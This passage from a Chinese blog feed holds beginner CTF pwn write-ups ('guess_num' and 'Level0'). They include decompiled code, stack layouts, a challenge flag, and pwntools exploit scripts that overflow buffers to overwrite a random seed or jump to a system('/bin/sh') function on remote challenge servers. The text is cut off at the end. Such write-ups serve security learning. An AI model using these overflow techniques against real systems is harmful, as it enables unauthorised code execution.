title="guess_num"></a>guess_num</h1><h2 id="检查文件属性及其保护"><a href="#检查文件属性及其保护" class="headerlink" title="检查文件属性及其保护"></a>检查文件属性及其保护</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yangmutou<span class="meta">@yangmutou</span>-virtual-<span class="string">machine:</span><span class="regexp">~/下载$ checksec ./</span>guess_num</span><br><span class="line">[*] <span class="string">'/home/yangmutou/\xe4\xb8\x8b\xe8\xbd\xbd/guess_num'</span></span><br><span class="line"><span class="symbol">    Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Partial RELRO</span><br><span class="line"><span class="symbol">    Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      PIE enabled</span><br><span class="line">yangmutou<span class="meta">@yangmutou</span>-virtual-<span class="string">machine:</span>~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>开启了Canary 保护，NX（DEP）保护PIE（ASLR），<br>这里我们再稍稍 记下这些保护的作用</p></blockquote><h1 id><a href="#" class="headerlink" title></a></h1><h2 id="拖入ida-开始分析漏洞："><a href="#拖入ida-开始分析漏洞：" class="headerlink" title="拖入ida 开始分析漏洞："></a>拖入ida 开始分析漏洞：</h2><blockquote><p>这里需要了解下 srand 以及 rand函数：</p></blockquote><blockquote><p>链接：<a href="https://blog.csdn.net/cmm0401/article/details/54599083" target="_blank" rel="noopener">https://blog.csdn.net/cmm0401/article/details/54599083</a></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);                         <span class="comment">// 交互    1</span></span><br><span class="line">  gets(&amp;v8);                                    <span class="comment">//gets()是危险函数，漏洞点就在这里</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);                  <span class="comment">// 交互     2  </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )                             <span class="comment">// 即是 让我们输入的数 等与  随机生成的数  10次</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();                                    <span class="comment">// system("cat flag");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="我们点进去-gets函数的参数在栈中空间大小"><a href="#我们点进去-gets函数的参数在栈中空间大小" class="headerlink" title="我们点进去 gets函数的参数在栈中空间大小"></a>我们点进去 gets函数的参数在栈中空间大小</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"><span class="number">0000000000000040</span> ; D/A/*   : change type (data/ascii/array)</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ; N       : rename</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ; U       : undefine</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ; Use data definition commands to create local variables <span class="keyword">and</span> function arguments.</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ; Two special fields <span class="string">" r"</span> <span class="keyword">and</span> <span class="string">" s"</span> represent <span class="keyword">return</span> address <span class="keyword">and</span> saved registers.</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ; Frame <span class="symbol">size:</span> <span class="number">40</span>; Saved <span class="symbol">regs:</span> <span class="number">8</span>; <span class="symbol">Purge:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span> ;</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span></span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000040</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000003</span>F                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000003</span>E                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000003</span>D                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000003</span>C var_3C          dd ?</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000003</span>8 var_38          dd ?</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000034</span> var_34          dd ?</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000030</span> var_3<span class="number">0</span>          db ?              <span class="regexp">//</span>这里</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>F                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>E                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>D                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>C                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>B                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>A                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>9                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000002</span>8                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000027</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000026</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000025</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000024</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000023</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000022</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000021</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>F                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>E                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>D                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>C                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>B                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>A                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>9                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>8                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000017</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000016</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000015</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000014</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000013</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000012</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000011</span>                 db ? ; undefined/<span class="regexp">/到这里</span></span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000010</span> seed            dd <span class="number">2</span> dup(?)   /<span class="regexp">/发现紧跟着的就是 srand函数种子 seed  </span></span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>8 var_8           dq ?          <span class="regexp">//</span>于是我们将它覆盖为 <span class="number">1</span></span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000000</span>  s              db <span class="number">8</span> dup(?)</span></span><br><span class="line"><span class="ruby">+<span class="number">000000000000000</span>8  r              db <span class="number">8</span> dup(?)</span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000010</span></span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000010</span> ; <span class="keyword">end</span> of stack variables</span></span><br></pre></td></tr></table></figure><blockquote><p>我们发现v8在栈中是  0x20大小，构造payload:’a’*0x20+p64(1)</p></blockquote><h3 id="继续分析："><a href="#继续分析：" class="headerlink" title="继续分析："></a>继续分析：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);                         <span class="comment">// 交互    1</span></span><br><span class="line">  gets(&amp;v8);                                    <span class="comment">//gets()是危险函数，漏洞点就在这里</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);                  <span class="comment">// 交互     2  </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )                             <span class="comment">// 即是 让我们输入的数 等与  随机生成的数  10次</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();                                    <span class="comment">// system("cat flag");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里我们 循环10次， 我们将种子已经覆盖为了1   所以 10次循环后的V7 的值都想等相等，所以我们构造下面的exp： </p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#值得一看的链接：https:<span class="comment">//www.jianshu.com/p/0bc6c65addfd</span></span><br><span class="line">#!usr/bin/python</span><br><span class="line">#coding:utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span>          </span><br><span class="line">#conn=process(<span class="string">'./guess_num'</span>)</span><br><span class="line">conn=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'55942'</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">num=str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">conn.sendline(num)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line">#cyberpeace&#123;<span class="number">72e39663</span>d5933ee27251b1a934c07778&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#   这里需要使用 C函数  使用python自带的ctype模块：</span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">    来实现python和c的混合编程</span><br><span class="line">    </span><br><span class="line">#设置日志等级为<span class="string">'debug'</span>,屏幕上打印所有所有发送和收到的数据</span><br></pre></td></tr></table></figure><h3 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h3><ul><li>可以使用ldd查找：</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldd</span> guess_num</span><br></pre></td></tr></table></figure><ul><li>也可以在脚本里查找：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">elf</span> = ELF(<span class="string">'./guess_num'</span>)</span><br><span class="line"><span class="attr">libc</span> = elf.libc</span><br></pre></td></tr></table></figure><blockquote><p>拓展些C与python混合编程：<a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a></p></blockquote><h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>表示有点难，主要是 自己的知识面太少导致的！还是 掌握知识速度太慢了！不过做出来一题，学习到一些东西，还是很会让人开心的，不过太慢了，。。。。。<br><img src="https://s2.ax1x.com/2019/09/27/uuZ839.png" alt="uuZ839.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;真难！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn02</title>
    <link href="http://yoursite.com/2019/10/06/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn02/"/>
    <id>http://yoursite.com/2019/10/06/国庆七天之pwn02/</id>
    <published>2019-10-06T12:40:20.000Z</published>
    <updated>2019-10-07T15:46:26.708Z</updated>
    
    <content type="html"><![CDATA[<p>只能做做新手题…</p><a id="more"></a><h1 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h1><h2 id="检查文件属性及保护："><a href="#检查文件属性及保护：" class="headerlink" title="检查文件属性及保护："></a>检查文件属性及保护：</h2><blockquote><p>64位elf程序，并且开启了NX保护！于是栈和bss段就只有读写权限，没有执行权限</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">checksec</span> <span class="string">level0</span></span><br><span class="line"><span class="string">[*]</span> <span class="string">'/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/level0'</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span></span><br></pre></td></tr></table></figure><h2 id="拖入ida分析："><a href="#拖入ida分析：" class="headerlink" title="拖入ida分析："></a>拖入ida分析：</h2><blockquote><p>代码很短，一个写入函数写入0xD个字符到hell0，world的首部！，然后返回并执行了另一个vulnerable_function()函数!</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vulnerable_function()我们跟进去：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到它从*buf[0]rsp+0处开始向后最大可读取200个字符，而这个buf数组只有0x80的大小，再高8个地址是的调用函数之前的ebp地址，再高8个地址是call 指令的下一条指令，也是返回地址！<br>所以，这题应该就是用system(“/bin/sh”)所在地址覆盖掉返回地址，也就是取得shell权限，然后ls，再cat flag！<br>于是我们找下system(“/bin/sh”)所在地址：0000000000400596</p></blockquote><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; =============== S U B R O U T I N E =======================================</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; Attributes: bp-based frame</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 public callsystem</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> callsystem      proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400597</span>                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>A                 <span class="keyword">mov</span>     edi, offset command <span class="comment">; "/bin/sh"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>F                 <span class="keyword">call</span>    _system</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A4                 <span class="keyword">pop</span>     rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 <span class="comment">; &#125; // starts at 400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 callsystem      endp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5</span><br></pre></td></tr></table></figure><h2 id="栈的结构："><a href="#栈的结构：" class="headerlink" title="栈的结构："></a>栈的结构：</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">被调用函数压入的变量，这里就是 <span class="keyword">buf</span></span><br><span class="line"><span class="keyword">老ebp</span></span><br><span class="line"><span class="keyword">返回地址</span></span><br><span class="line"><span class="keyword">调用函数压入的变量</span></span><br></pre></td></tr></table></figure><h2 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#conn=process('./level0')</span></span><br><span class="line"><span class="attribute">conn</span>=remote('111.198.29.45','51014')</span><br><span class="line"><span class="attribute">call_system</span>=0x0000000000400596</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=0x88*'a'+p64(call_system)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"><span 